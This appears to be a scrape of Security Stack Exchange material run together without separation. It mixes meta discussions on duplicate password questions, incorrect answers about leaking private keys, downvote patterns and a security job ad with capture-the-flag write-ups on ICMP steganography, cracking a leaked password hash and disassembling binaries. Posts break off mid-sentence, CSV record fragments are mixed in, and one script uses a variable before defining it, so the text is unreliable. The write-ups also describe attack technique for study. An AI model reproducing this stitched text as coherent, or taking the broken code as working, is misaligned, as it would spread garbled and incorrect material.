<p>We're not trying to tell people to just go RTFM.  I've seen too many cases on this site of overzealous users who tried to close questions as duplicates of questions that are only tangentially related.  Using vote-to-close as a way to say ""Answering individual questions like yours is too much work, but here's a link to an indirectly-related generic answer that might answer your question"" isn't helpful, it's OCD.</p>

<p>An intermediate solution to this is having a canonical answer for common variations, like adding foreign words, adding part of the website name, using the current year in your password, etc.  We already have this, although many of the answers aren't very good.</p>

<p>Duplicate closures are a tricky subject.  For more see <a href=""https://meta.stackexchange.com/questions/74080/close-as-duplicate-what-if-only-the-answer-is-a-duplicate"">this meta question</a> .</p>

<p>Current questions are not a good candidate for a single canonical answer (these are the only ones I found, please comment any other ideas you have):</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase"">XKCD #936: Short complex password, or long dictionary passphrase?</a>  is mostly about something else entirely: comparing two specific schemes.  You'd have to read between the lines to understand the point.</li>
<li><a href=""https://security.stackexchange.com/questions/104046/what-type-of-pattern-should-i-use-for-my-passwords/104047#104047"">What type of pattern should I use for my password?</a> Is too succinct to provide the wake-up call you want.  It doesn't even explain the basics of password entropy.</li>
</ul>

<p>Closing new questions like ""is wwwwwwwwwwwwwwww a secure password?"" to any of these questions would be confusing and even potentially rude.</p>

<h2>Picking a recommended password generation scheme is controversial</h2>

<p>Password managers are one of the best solutions, but are a pain for many people.  I have family members that don't lock their phones.  You think you can force them to roll some dice and use a third-party app just to protect their Disqus account? There are also many places they don't work like websites that block copy and paste, hardware like smart TV or videogame systems, public computers, phones under some circumstances, etc.</p>

<p>I've tried to start a question about how long passwords should be, only for the idea to be ""too subjective"" under its most general application, and already covered under more narrow formulations thanks to similar questions like <a href=""https://security.stackexchange.com/questions/69374/is-an-80-bit-password-good-enough-for-all-practical-purposes/69378"">this</a>.  A user in the comments told me a 32-character alphanumeric password would be sufficient for some people but not for others (even though over 90 bits of entropy your password becomes <a href=""https://security.stackexchange.com/questions/168479/expert-quote-on-entropy-for-uncrackable-password/168511"">ridiculously hard to crack</a>).</p>

<p>Various widely accepted systems like diceware and xkcd have been their own source of controversy (see <a href=""https://www.schneier.com/blog/archives/2014/03/choosing_secure_1.html"" rel=""nofollow noreferrer"">Bruce Scheier's criticism</a>).  These widely accepted systems have also seen several extensions, from different separators between words, casing changes, using online generators vs dice, and using foreign words.  </p>

<p>Given all these points of personal opinion, are you really going to tell a user that their idea is dumb and your idea is unequivocally better?</p>

<h2>Standard points that would have to be made in the one-size-fits-all question</h2>

<ul>
<li>Explanation of threat models like brute force, shoulder surfing, plaintext leak, or offline cracking</li>
<li>Advantages and disadvantages of a password manager</li>
<li>Explanation of how entropy is computed as a result of password generation, not just apparent complexity</li>
<li>Discussion of memorability vs guessability tradeoffs.</li>
<li>Ideally, if I have two passwords of yours, it should still be very difficult to guess another password.</li>
<li>Either explain the most common tricks individually like repetition and changing characters, or walk through how to calculate Kerchoff's principle and, discuss where each should be used.</li>
</ul>

<h2>Pros and Cons of redirecting all dumb trick questions to one new canonical one</h2>

<p>Pros:</p>

<ul>
<li>Less redundant information and effort explaining things like why a password manager is good, what entropy is, what the threat scenarios are, how cracking works, why it's hard to outsmart password crackers.</li>
<li>More focus on one good answer to this question rather than hundreds of answers</li>
<li>Leaner site with less clutter</li>
<li>Fewer dumb questions that annoy experts</li>
</ul>

<p>Cons:</p>

<ul>
<li>Reduces unique information for each password question asked, making our answers less useful.</li>
<li>Less Google-friendly design.  Asking ""Does repeating words make my password more secure?"" directs you to a page which redirects you to a lengthy general explanation of password strategies instead of going straight to a targeted answer ""No, password crackers can predict that, you don't really gain anything by repeating words.""  </li>
<li>Would probably result in overzealous behavior, causing good, legitimate questions to be misunderstood and closed.</li>
<li>Can be offensive to the asker who didn't realize their closed question was dumb and now is told their question doesn't belong here and they should have already found the answer.</li>
</ul>

<p>Some unique information can be generated for each password scheme:</p>

<ul>
<li>Is the scheme recommended by any researchers or websites?</li>
<li>How usable is this password scheme?</li>
<li>Is the scheme already covered by common rules in software like hashcat?</li>
<li>Does the scheme seem like nation-state actors might be able to compromise it?</li>
<li>Does the scheme seem likely to be misused, compromising it's security?</li>
</ul>

<p>Even though there are problems with the way it's currently set up, I'd say we keep doing what we're doing.  Creating one canonical answer would probably help these dumb trick questions, but creating a canonical answer would be difficult, deciding which questions to close as dupes of it is controversial, and the askers might still find the redirection to a canonical answer unfriendly and unclear.</p>

<p>I am wondering what should be done when a popular question is getting answers that are downright incorrect, to the point of being dangerous? When it's just one answer, the solution is simple, but in this case it is nearly all answers, and they all have high upvotes.</p>

<p><a href=""https://security.stackexchange.com/questions/175310/how-great-is-the-risk-in-publicly-sharing-part-of-a-private-key/175313"">How great is the risk in publicly sharing part of a private key?</a> is the question in mind. In it, someone is asking what the danger of revealing a small part of the private key is. While his example size was 256 bits, it seemed fairly clear that he was talking about public key cryptography. The answers involved some of the following (paraphrased):</p>

<ul>
<li>Why would you want to do that? Just share the public key.</li>
<li>Leaking only a tiny bit doesn't matter. A 4k key with 2048 bit leaked still has a 2^2048 keyspace.</li>
<li>Brute force is easier than factoring so it's fine to leak a little bit.</li>
<li>It doesn't matter what part of the key is leaked. <em>n</em> bits is <em>n</em> bits.</li>
</ul>

<p>All of these are incorrect or non-answers. For example, it is untrue that leaking a small bit of a private key is safe, because only a tiny tiny fraction can completely destroy the security, whereas if all that is leaked is the exponent, no security is lost at all. I found only one answer that was correct in the comments:</p>

<blockquote>
  <p>All information in a private key is not equal, so there is no ""equivalent factor"". Leak the modulus or public exponent and nothing happened (versus sharing the public key). Leak ""50%"" of the prime numbers and you're 100% boned</p>
</blockquote>

<p>However, this patently incorrect comment has double the upvotes:</p>

<blockquote>
  <p>As factoring semiprimes is assumed to be so secure that brute force is the best possible attack</p>
</blockquote>

<p>This should not be happening, especially with something this basic. If this question were moved to Crypto.SE, the answers wouldn't even be close to acceptable. What can be done about this? Should it be moved to Crypto.SE to let the answers get the downvotes they deserve? Should I just ignore it and move on?</p>

<p>Ppl want to close this question as off-topic.</p>

<p>I don't understand.</p>

<p>I tried to word my question very carefully so that it'd be on-topic.</p>

<p>From my question:</p>

<blockquote>
  <ol>
  <li>Does the policy not to lift bans issued for hackers' behaviours arise from the difficulty of determining whether the account was indeed hacked?</li>
  <li>If the above is true, is it more difficult to determine whether the account was used by its legitimate owner on a given occasion than who is the legitimate owner and whether its current user is the legimitate owner (since support does trouble itself with account recovery)?</li>
  </ol>
</blockquote>

<p>These are technical questions. About information security. IIUC.</p>

<p>Notice I <strong>do not</strong> ask:</p>

<blockquote>
  <p>Why do sites / games tend to have a policy not to lift bans issued for hackers' behaviours?</p>
</blockquote>

<p>Such a question would be off-topic. Possibly it would be on-topic on community management SE.</p>

<p>But instead I ask if it is very difficult to determine if an account was used by its legitimate owner on any occasion. And if it's more difficult to determine if an account is currently being used by its legitimate owner. This seems to me to be about information security.</p>

2853,2,2018-01-08T20:42:37.083,5,,"<p>The ""difficulty"" is <em>entirely</em> up to how the application was designed and what resources they have to analyse player behavior. That makes the question too broad and up to interpretation. One game will be easy, while another will be difficult. </p>

<p>Once you put in the LoL example, then it becomes about LoL, and only LoL staff can answer your question. If you remove the example, then you are back to ""it depends on how the game was designed.""</p>

<li>the available data</li>
<li>the tools in place to analyse that data</li>

<p>So, what's wrong with the question is that the answer is a non-committal shrug.</p>

<h3>What are Community Promotion Ads?</h3>

<p>Community Promotion Ads are community-vetted advertisements that will show up on the main site, in the right sidebar. The purpose of this question is the vetting process. Images of the advertisements are provided, and community voting will enable the advertisements to be shown.</p>

<h3>Why do we have Community Promotion Ads?</h3>

<p>This is a method for the community to control what gets promoted to visitors on the site. For example, you might promote the following things:</p>

<ul>
<li>useful or cool security related open source apps</li>
<li>the site's twitter account</li>
<li>cool events or conferences</li>
<li>anything else your community would genuinely be interested in</li>
</ul>

<p>The goal is for future visitors to find out about <em>the stuff your community deems important</em>. This also serves as a way to promote information and resources that are <em>relevant to your own community's interests</em>, both for those already in the community and those yet to join. </p>

<h3>Why do we reset the ads every year?</h3>

<p>Some services will maintain usefulness over the years, while other things will wane to allow for new faces to show up. Resetting the ads every year helps accommodate this, and allows old ads that have served their purpose to be cycled out for fresher ads for newer things. This helps keep the material in the ads relevant to not just the subject matter of the community, but to the current status of the community. We reset the ads once a year, every December.</p>

<p>The community promotion ads have no restrictions against reposting an ad from a previous cycle. If a particular service or ad is very valuable to the community and will continue to be so, it is a good idea to repost it. It may be helpful to give it a new face in the process, so as to prevent the imagery of the ad from getting stale after a year of exposure.</p>

<h3>How does it work?</h3>

<p>The answers you post to this question <em>must</em> conform to the following rules, or they will be ignored. </p>

<ol>
<li><p>All answers should be in the exact form of:</p>

<pre><code>[![Tagline to show on mouseover][1]][2]

   [1]: http://image-url
   [2]: http://clickthrough-url 
</code></pre>

<p>Please <strong>do not add anything else to the body of the post</strong>. If you want to discuss something, do it in the comments.</p></li>
<li><p>The question must always be tagged with the magic <a href=""/questions/tagged/community-ads"" class=""post-tag moderator-tag"" title=""show questions tagged &#39;community-ads&#39;"" rel=""tag"">community-ads</a> tag. In addition to enabling the functionality of the advertisements, this tag also pre-fills the answer form with the above required form.</p></li>
</ol>

<h3>Image requirements</h3>

<ul>
<li>The image that you create must be 300 x 250 pixels, or double that if high DPI.</li>
<li>Must be hosted through our standard image uploader (imgur)</li>
<li>Must be GIF or PNG</li>
<li>No animated GIFs</li>
<li>Absolute limit on file size of 150 KB</li>
<li>If the background of the image is white or partially white, there must be a 1px border (2px if high DPI) surrounding it.</li>
</ul>

<h3>Score Threshold</h3>

<p>There is a <strong>minimum score threshold</strong> an answer must meet (currently <strong>6</strong>) before it will be shown on the main site.</p>

<p>You can check out the ads that have met the threshold with basic click stats <a href=""https://security.meta.stackexchange.com/ads/display/2865"">here</a>.</p>

The answers are far too specific to secrets with the specific properties of encryption keys such that editing them to be more general would not be as simple as changing the phrasing. For example, peppers can simply be stored in a file in <code>/etc</code>, since all that matters is that it will not be leaked during an SQLi dump of the database. The candidate you propose, being specific for encryption keys, goes on to say that storing a pepper on the filesystem is next to useless. Likewise typing out a user's authentication token at system boot and storing it in memory makes no sense, unless ""authentication token"" is replaced with ""disk encryption key"". In my opinion:</p>

<ul>
<li>If the question is about where to store a specific bit of <em>sensitive</em> data (but not an encryption key), it should be allowed to exist as its own question. Different questions have different threat models.</li>
<li>If the question is about where to store an <em>encryption key</em>, it should be marked as a duplicate of your candidate. After all, it does explain exactly how to deal with keys.</li>

<ul>
<li>Your idea sounds complex, and complex questions aren't a good fit.  First, complex questions almost never have just one right answer.  Second, a question with ten ideas and ten issues is much worse than a question with one idea and one issue.</li>
<li>Submitting an idea for feedback rarely works well on this site.  I'll do you the favor of assuming you're a serious student or professional who understands fundamental security concepts and isn't trying to reinvent standard industry technologies (there are a lot of very naive and unprofessional proposals on this site).  Even if your idea is good, improving it would be an extended discussion or reviews and re-reviews.  That kind of back-and-forth dialogue isn't well suited for a question and answer site</li>
<li>As Shroeder pointed out, questions about programming (i.e. hosting solutions, languages, error messages, code issues, etc.) are not on topic here. Questions about security (blacklists vs whitelists, XSS formats, security policies) are on-topic.  Questions about techniques, technologies, and tools fall into a grey area.  Questions here should be the kind a CISO or pen-tester would answer, not the kind a software engineer at Kapersky would answer.</li>
<li>As Shroeder pointed out, asking for recommdenations is not on topic because it's hard for those to have a ""correct"" answer and they're not useful to others because the answer to the question would change every few years.</li>

<p>I think this is a problem with a few select users, not the majority.  There are about 23% of downvotes that come from 14 users who collectively have submitted 0.5% of posts in the past 5 years.  5% of downvotes come from 10 users who have fewer than 10 recent posts on this site.  A few of these users have only given two answers and yet have given hundreds of downvotes.  </p>

<p>I assume most downvotes are genuine, but I do believe there are abusive and incorrect patterns that need to be rooted out on occasion.  One of these patterns of abuse may be a small group of users who vote excessively despite being unfamiliar with the asking and answering experience.</p>

<p>This pattern of users who vote but don't answer helps incorrect answers to rise to the top and decent questions to get mocked.  This is supposed to be a community of experts, not Reddit's r/funny, and the criteria for what's good and bad are complicated. Looking the other way while a user who's barely demonstrated any understanding of infosec or Stack Exchange makes hundreds of judgments about what threats are and aren't realistic,  what ideas don't work in practice, and what is and isn't on-topic is irresponsible.   How can a user with too few reputation to see ""vote counts"" give out over 200 downvotes?</p>

<p>(<strong>Edited</strong> to add the next two paragraphs)  There should be enough votes from everyone that one person's biases or shortcomings are washed out in the community. One user shouldn't be able to manipulate the standards of a ""bad question"" to fit his views. Similarly, I'm not sure enough about each moderator's biases to be comfortable with them giving me 5% of my downvotes. </p>

<p>Say one of these people decides questions on workplace security policies aren't on-topic enough, that naive questions are always unacceptable, or that long questions like these are preferable to laconic ones? Do you want him making that judgement on over a thousand questions and single-handedly shaping community opinion? If one person becomes a dominant voice on this community of thousands, we need to hold them to a higher standard of impartiality, experience, and oversight.</p>

<p>Be aware that one or two of the long-time users who frequent Meta are on the list of people voting far more than they post, and so this may question may stir up some criticism and controversy.  I'm honestly curious what the lurkers have to say and what their side of the story is.</p>

<p>The heart of this question is 1) whether we want to discourage some users from spending an extreme and disproportionate amount of time reviewing and criticizing questions (especially doing less-constructive activities like downvoting) instead of contributing answers to questions, and 2) whether we trust these people enough to give the loudest person in the room a disproportionate and anonymous input into community standards</p>

<p>Solutions could include:</p>

<ul>
<li>Moderators sending messages to and working with individuals who display excessive behavior to understand their circumstances and take action if necessary</li>
<li>Encouraging users who lurk but don't answer to answer more questions</li>
<li>Limiting extreme behavior (e.g. rate limiting votes to about 5/minute to make sure serial voters have time to read the question, rate-limiting votes before users have 1000 rep, a policy that if you're going to vote more than 30 times in a week you need to have answered at least one question in the past two months, etc.)</li>
<li><strong>Added</strong> solution: On the positive side, just encourage people to vote more and participate more so that one or two frequent users don't determine the voice of the community just because they vote often</li>

<p>Thanks for bringing this up and providing some good statistics to work from!</p>

<blockquote>
  <p>5% of downvotes come from 10 users who have fewer than 10 recent posts on this site.</p>
</blockquote>

<p>I think this is the really interesting statistic here. It could indicate a problem, but it could also be perfectly fine. To investigate, I took a look at those users and some proxies to if their downvoting is positive or not.</p>

<ul>
<li><strong>They are active on other sites.</strong>  Seven has more than 5k in total on other sites. Six have more than 5k in total on a single other site. In general, people have reputation on technology sites. This signals that they contribute relevant knowledge.</li>
<li><strong>They also upvote.</strong> Only two have a downvote to upvote ratio over three. This indicate that they are not just troll downvoting, but actually judging the quality of posts.</li>
</ul>

<p>Of the ten, there is only one that has little reputation on other sites and doesn't also upvote. That user has seven posts that has received a total of 17 upvotes and 0 downvotes.</p>

<p>It is also worth pointing out that out of the five percent, two come from one single use. That user has a short program for post quality in their profile, and to me seems to be a very valuable contributor.</p>

<h1>Conclusion</h1>

<p>Downvoting itself is not bad. In fact, we need more of it. Recently I made a silly math error in an answer, that led me to a wildly incorrect conclusion. I got four upvotes and no downvotes.</p>

<p>But there are bad downvotes, off course. And making lots of downvotes and posting few posts could be an indicator on that. But to me, that does not seem to be the case here.</p>

<p>So I do not think we have a problem here, and we do not need to take any action. Or am I missing something?</p>

It is not a topic within security, and hence should not be a tag. A meta question is good, but it risks getting out of hand. There are surely ten XSS questions I would include, and a hundred topics like XSS...</p>

<p>I think there is already a feature intended exactly for this sort of thing - tag wikis. There they will be neatly arranged by topic. And who knows, someone asking questions might even stumble across them...</p>

<p>Still, the tag wikis will need some love for this to happend. So I would recommend picking something close to heart, and start listing. While at it, editing the linked questions could be a good idea. With a focus on making them more general, removing clutter, and writing good, descriptive titles.</p>

2893,2,2018-02-19T23:55:36.543,13,,"<p>Personally I like the advert, I think it's positive, quirky enough to gain interest, and has most of the information I would need. However I have a couple of thoughts:</p>

<ul>
<li><strong>Advertising</strong></li>
</ul>

<p>To reach people, I would suggest that SO jobs is not your best bet. Purely because it is so heavily weighted to developer jobs that security folks don't use it. Instead, I would suggest professional networks are the way to go. LinkedIn is an obvious one, and I'm more than happy to share the advert with my network as around 1400 of my contacts are senior security folks [status-completed]. You could also sponsor or attend the odd security event or conference - this is after all where security people go, however different conferences have different audiences, so choosing the right one will be essential.</p>

<p>Another option is the professional headhunter route - pretty effective, and I have used this in the UK, but it is a cost option so perhaps wait until networking fails. </p>

<ul>
<li><strong>Reporting Line</strong></li>
</ul>

<p>Typically, I'd expect the Director of Security in an organisation the size of Stack Exchange to be, in effect, the CISO, as they will have to shoulder the responsibilities and accountability of a CISO, especially as regards the New York State Legislation on named individuals taking responsibility for Cyber Security (currently only mandated for banking, insurance or FS, but likely to spread further). So this role really needs to be a peer of CTO and CRO, or at least able to have a seat at the top table on security decisions, otherwise they will not be empowered at a sufficient level and will still be blamed for failures in security.</p>

<ul>
<li><strong>Location</strong></li>
</ul>

<p>The advert doesn't make it 100% clear that this role could be anywhere. It sounds very US based. Those of us who know Stack Exchange well have seen how well you work across the globe, both remotely and office-based, but I think you could perhaps expand on the non-US possibilities for those who may not be as familiar.  </p>

<ul>
<li><strong>Existing In-House Security Experience</strong></li>
</ul>

<p>Another small thing would be to give an indication of the existing security expertise. While you may not have dedicated security staff, it can be very reassuring to candidates to know what they have to work with. Sure, this can be discussed in interview, but it would be good to know what experience Jarrod, Mark, Geoff etc have in security.</p>

<p>Happy to chat further on any of those on my usual email if you need.</p>

2894,2,2018-02-20T00:00:15.377,8,,"<p>Very exciting development, though I do have a few comments: </p>

<ul>
<li>What you’ll do:

<ul>
<li>Some additional tasks should include things like SDLC and threat modeling (though perhaps this was intended in the things mentioned, just missing the terms of art)</li>
<li>Software security reviews, such as code reviews, static analysis, penetration testing, etc - or managing external testers. </li>
<li>Are there other relevant regulations? E.g. PCI-DSS, GDPR... Or leaving this up to them? </li>
</ul></li>
<li>What we're looking for:

<ul>
<li>""Experience in information security"" - this is actually a very very wide range of topics. Are you looking specifically for someone with software/appsec experience? Is a cryptographer a good match? What about a malware researcher? And so on. </li>
<li>Assuming you are looking more for someone focused on software security - what about your technology stack? (I am familiar with it, but not everyone is. Some people won't touch .NET...) Will they be expected to be elbow-deep in the code, or is this a hands-off / astronaut type of task? </li>
<li>Re ""frameworks and processes"" - some of that is likely to be too ""heavy"" for a place like SO, and may draw more enterprise-minded people. As opposed to e.g. OWASP's ASVS or OpenSAMM on the appsec side. </li>
<li>The certifications requirement is a big question mark in the security industry, even more so than in development. Some are big proponents of it, some are completely dismissive, my opinion is that for that most part the major value of most of these certs is in the low- to mid-range. (E.g. CISSP has a requirement of 4-years experience; that's about the sweet spot, and after 10 years in the industry it is not worth the upkeep). So while certs may be a helpful signal (and possibly useful in some markets), I appreciate that it was marked as ""(preferred)"" - but please do not put too much weight on this, one way or the other. </li>
</ul></li>
<li>Is this the first InfoSec hire, or is there already a team? If it is the first, are they expected to grow the team, or will it be a one-person show in perpetuity? </li>
<li>What is the current status of security operations in the company? Are there currently external auditors doing all the security reviews, and is that supposed to continue? What is the level of security expertise amongst the developers/SREs/etc? (Some people love working with only the best, some relish the challenge of a clean slate.)  </li>

2895,1,2018-02-20T04:01:13.680,1,70,"<p>More than half of the answers I have with many positive votes that are not accepted are answers to questions made by unregistered users. While I am not disputing the general conclusion <a href=""https://security.meta.stackexchange.com/q/2414/165253"">from here</a> (obviously it's entirely up to OP whether or not the answer is to be accepted), the situation in which the OP is unregistered is different. What should be done about answers to hit-and-run questions where the OP is a guest and thus <em>cannot</em> mark a question as accepted as soon as they close their session? It frustrates me that so many of my answers are on questions still marked as open, despite the fact that the OP will <em>never</em> be back on the same account to accept them, or any other answers.</p>

<p>A few relevant facts:</p>

<ul>
<li>Marking an answer is a decision made by the OP, but only if the OP <em>can</em> mark it.</li>
<li>Unregistered users are unable to accept answers as soon as they first leave.</li>
<li>Questions marked as unanswered are treated differently when displayed.</li>
</ul>

<p>With this in mind, I see no reason why allowing mods (or user votes) to accept an answer or mark a question as answered for an <em>unregistered</em> guest user would not be a good idea. Even if they do come back, they cannot mark the answer as accepted as they were unregistered at the time. I have even begun to check the OP's activity on various sites and how long they have been registered before deciding whether or not to answer (as my time may be better served answering other people), and that seems to me like it may be causing a prejudice against new users who I have begun to ignore.</p>

<p>In the past before I was registered, I've asked questions (and written answers) as a guest. I'd mark an answer if it was made in time for me to still be logged in, but quite a few times, I look back and see my old questions and see some answers that were only created recently, long after I had logged out of the unregistered account. I wish I could mark the answers as accepted, as some of them are really good.</p>

<p>There is a particular event in mind which actually caused me to lose reputation and a good answer because of this issue. A user asked a question that was fairly basic and was closed. This was after I wrote an answer which was voted up by the user, who could not accept it. For some reason, someone had downvoted my answer, bringing the score back to 0. Immediately after, the entire question and answer was deleted, due to being closed with an answer without positive votes. As a result, I lost 10 rep and a good answer. This would <em>not</em> have happened if the unregistered OP was actually able to mark it as accepted after they logged out. The fact that an accepted answer gives it immunity from being automatically deleted means that this is more than just an aesthetic desire.</p>

</blockquote>

<p>If you stop thinking about the green checkmark as indicating if the question is open or not, perhaps it will be less frustrating? I view the checkmark very narrowly - it indicates wheater OP has confirmed the asnwer helped them. With that perspective it would make no sense to let moderators or other users mark answers as accepted.</p>

<p>I agree that it is unfortunate that guests can not accept answers after their session has ended. But I think it is something we will have to live with. Focus on writing good answers to good questions, and in the long run I think the rep loss from this will be small in comparison to the rep you earn from upvotes.</p>

<p><strong>Edit to adress some more specific points:</strong></p>

<p>You are correct to point out that an answer being marked as not accepted affects how the system deals with the question:</p>

<ul>
<li>Bumping to frontpage.</li>
<li>Showing up in ""unanswered question"".</li>
<li>Autodeletion if question is closed.</li>
</ul>

<p>But all these (perhaps except bumping, not sure how it works) also take votes into account. If the answer has a positive score, the question will not show up as unanswered and it will not be autodeleted.</p>

<p>So there is already a mechanism here. We don't need a new one, in letting moderators or other users mark as accepted. If someone wants to indicate an answer is good, they upvote.</p>

So I kept digging and remarked that <code>ICMP</code> code field was sometimes <code>0</code> and sometimes <code>1</code>. There are no reasons for <code>ICMP</code> to have a code field at <code>1</code> when the type is <code>echo (8)</code>.</p>

<p>Quote from AviD:</p>

<blockquote>
  <p>If the question is based around either actual security measures, or business risk analysis...<br>
  AND if it's not about your grandmother getting scammed at home...
  AND if it's not about ""help i got phished quick what do i do""

<p>The answer lists a number of methods to identify phishing and scam mails which is basically the same methods we would apply if a user asks the question ""Is this a phishing attempt?"" </p>

<p>The answers in the question you link to are mostly about how to interpret the content with some technical analysis on the side. What if an infosec pro wants to know how to interpret some specifics in the header? I think that could be on topic. </p>

<p>I'm have only been on Worldbuilding.SE once or twice, so I could be wrong. Regardless of which forum is ultimately correct, my response would be:</p>

<p>If you use a very long key sequentially---and replace it before you run through it completely---then it is effectively a one-time pad and is very secure. (Provided the new key/pad is distributed securely.)</p>

<p>Each message must indicate where on the pad to begin, otherwise a missing or incomplete message would render subsequent messages indecipherable. Or perhaps you could neglect this issue and let it become a plot point.</p>

<p>For the sake of consistency, your characters should understand that their total biweekly communication cannot exceed the key length. This would add some terseness to the messages and potentially some plot tension if one character needs to communicate as his pad is running out.</p>

<p>If this ""due diligence"" mitigation of Vignere brokenness needs to be overcome, you  have options. The adversary can simply start intercepting and making copies of their pads. Alternatively, the one-time pad may not be truly random, and the adversary could determine how it is created.</p>

<h2>Solution:</h2>

<p>We were given a pcap file and we had to somehow find hidden messages. The statistics tools of wireshark can give some great general insight of the traffic. I usually start from there and view the ""Conversations"", ""Endpoints"" and if there's HTTP traffic, I view the requests. I also try to scroll through the packets very fast and try to see if there's any anomaly:</p>

<p><a href=""https://i.stack.imgur.com/qvKUl.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/qvKUl.png"" alt=""statistics tools""></a></p>

<p>While scrolling through the packets, there were a lot of HTTP traffic. So I viewed the HTTP requests under Statistics:</p>

<p>Some update/ubuntu/steam related stuff, not very interesting. Moving on to the end of the captured packets, I noticed a stream of (malformed?) ICMP packets:</p>

<p><a href=""https://i.stack.imgur.com/E3TH5.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/E3TH5.png"" alt=""malformed icmp packets""></a></p>

<p>The first ICMP packet had a type of <code>71</code>, the second one had a type of <code>73</code> and the third had a type of <code>70</code>, followed by <code>56</code> and <code>57</code>. Does this sound familiar? :_)</p>

<p><a href=""https://i.stack.imgur.com/CZTA1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/CZTA1.png"" alt=""ICMP types to chr""></a></p>

<p>There's probably a GIF file hidden in the ICMP packets! Since I didn't want to extract all bytes by hand I wrote a small script with <a href=""https://github.com/KimiNewt/pyshark"" rel=""nofollow noreferrer"">pyshark</a>:</p>



<pre><code>import pyshark

cap = pyshark.FileCapture('./data.pcap', display_filter='icmp')

for packet in cap:
    data += chr(int(packet['icmp'].type))

with open('result.gif', 'w') as f:
    f.write(data)
print 'done'
</code></pre>

<p>Unfortunately the GIF file was corrupt and couldn't view it, but it contained <code>lol nice job</code>?!</p>

<p><a href=""https://i.stack.imgur.com/VjLTd.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/VjLTd.png"" alt=""lol nice job""></a></p>

<p>I must be close I thought. After analyzing the packets, I noticed that most of the ICMP packets were sent by <code>Cybertan c8:3d:d4:7a:f3:47</code> but some were sent by Cisco. It turns out that the router/recipient was replying to some of the packets. I decided to filter the packets to only include packets from <code>c8:3d:d4:7a:f3:47</code>:</p>



<pre><code>import pyshark

cap = pyshark.FileCapture('./data.pcap', display_filter='icmp')
data = ''

for packet in cap:
    if packet.eth.src == 'c8:3d:d4:7a:f3:47':

<h2>Solution:</h2>

<p>We are presented with a login screen and since this is a web challenge, I tend to use my favourite http proxy: Burp. This allows me to view all traffic received/sent from the webserver. Sending <code>foobar</code> as username and <code>bazqux</code> as password, the UI pops up an alert stating ""invalid credentials"". Burp however intercepted the following response:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=""en""&gt;
&lt;head&gt;
&lt;meta charset=""utf-8""&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;No such user: foobar&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>There's some JavaScript magic in the webpage that of course handles this. The website and the challenge description both state that only the <code>DUNGEON_MASTER</code> may enter the vault, let's try that as username:</p>

<p><a href=""https://i.stack.imgur.com/PQTj1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PQTj1.png"" alt=""only dungeon master may enter""></a></p>

<p>Wrong credentials again but the response was different this time:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=""en""&gt;
&lt;head&gt;
&lt;meta charset=""utf-8""&gt;
&lt;title&gt;Error&lt;/title&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>The passwords are hashed but showing the expected hash in the response is definitely not right. Turns out that the hashing algorithm is SHA256.
Next step is to figure out the original value of the hash. Since hashing algorithms are one way, there's no way to turn back unless we use bruteforce, rainbow tables or just google for websites with huge databases that have done this before. Some sites didn't contain the hash but the following did: <a href=""https://crackstation.net/"" rel=""nofollow noreferrer"">https://crackstation.net/</a> .

<p>We have <code>foo[1-15]</code> functions and a main function. The foo functions return certain values. If we convert these integers to their respective ASCII values, we get the flag.</p>

<p>The above approach is a bit lame, so let's solve this in another way with <a href=""https://github.com/radare/radare2"" rel=""nofollow noreferrer"">radare2</a>. r2 is a reverse engineering framework, it can be automated with <a href=""https://github.com/radare/radare2-r2pipe"" rel=""nofollow noreferrer"">r2pipe</a>. So I wrote the following script in order to extract the flag from the functions:</p>

<pre><code>import r2pipe

print(""[+] Opening binary..."")
r2 = r2pipe.open(""./adventure"")

print(""[+] Analysing the binary..."")
r2.cmd(""aaa"")

print(""[+] Looping through foo[1-15] functions..."")
flag = ''
for i in range(1, 16):
    print(""[+] Disassembling foo%s function..."" % i)
    instructions = r2.cmdj(""pdj 4 @sym.foo"" + str(i))  # Get first 4 assembled instructions
    opcode = instructions[-1]['opcode'].strip()  # Get last instruction
    character = chr(int(opcode[-4:], 16))  # Convert hex character from opcode to ASCII
    print(""Opcode: "" + opcode + "", chr: "" + character)
    flag += character

print(""flag: "" + flag)
</code></pre>

<p>Here's the script's output:</p>

<p>For one such as yourself, apprentice to the arts of time manipulation, you must pass this first trial with a dreadful creature.</p>

<hr>

<h2>Solution:</h2>

<p>We were given an unstripped 32-bit ELF binary:</p>

<pre><code>$ file return 
return: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=5e510acf107cc9f91edd02f76f14598fcb30de6b, not stripped
</code></pre>

<p>First thing to know when pwning a binary is to check the security measures enabled:</p>

<pre><code>$ checksec return 
[*] '/home/vagrant/sharedFolder/ctf/swamp/apprentice_return/return'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>

<p>So the most important thing to keep in mind is that the NX bit is set which stands for <a href=""https://en.wikipedia.org/wiki/NX_bit"" rel=""nofollow noreferrer"">No-eXecutable</a>. Let's open the binary in <a href=""https://binary.ninja/"" rel=""nofollow noreferrer"">Binary Ninja</a>. The main function is quite straightforward, it calls the <code>doBattle()</code> function, after that it prints some text:</p>

<p><a href=""https://i.stack.imgur.com/pagkU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pagkU.png"" alt=""main disas""></a></p>

<p>I guess the <code>doBattle()</code> is the function we're supposed to pwn. However, it is worth noticing another interesting function in the functions list called <code>slayTheBeast()</code>:</p>

<p><a href=""https://i.stack.imgur.com/XuHGP.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/XuHGP.png"" alt=""slayTheBeast disas""></a></p>

<p>This function basically <code>cat</code>s the flag for us. Which means we probably need to somehow jump to this function. Let's examine the <code>doBattle()</code> function:</p>

